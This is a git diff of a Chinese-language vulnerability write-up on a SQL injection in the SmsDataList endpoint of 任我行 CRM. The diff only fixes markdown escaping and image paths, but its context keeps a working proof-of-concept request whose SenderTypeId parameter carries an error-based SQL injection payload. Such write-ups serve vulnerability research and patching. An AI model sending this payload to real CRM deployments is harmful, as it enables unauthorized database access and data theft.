@@ -2,7 +2,7 @@
 
 ## 漏洞描述
 
-*任我行CRM*系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。
+_任我行CR&#x4D;_&#x7CFB;统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。
 
 任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息。
 
@@ -18,7 +18,7 @@
 
 登陆页面
 
-![image-20230828150050416](images/image-20230828150050416.png)
+![image-20230828150050416](../.gitbook/assets/image-20230828150050416.png)
 
 验证POC
 
@@ -30,4 +30,4 @@ Host:
 Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
 ```
 
-![image-20230828150106754](images/image-20230828150106754.png)
+![image-20230828150106754](../.gitbook/assets/image-20230828150106754.png)
